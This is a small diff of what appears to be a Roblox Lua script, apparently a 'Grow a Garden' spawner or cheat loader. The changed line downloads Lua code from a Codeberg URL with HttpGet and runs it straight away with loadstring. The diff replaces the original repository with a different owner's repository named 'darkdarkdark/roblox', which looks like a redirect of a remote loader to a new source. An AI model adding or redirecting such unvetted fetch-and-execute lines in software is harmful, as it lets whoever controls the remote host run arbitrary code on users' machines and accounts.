@@ -178,7 +178,7 @@ task.spawn(function()
 
 	-- Executa o script externo
 	pcall(function()
-		loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+	loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
 Spawner.Load()
 	end)
 end)
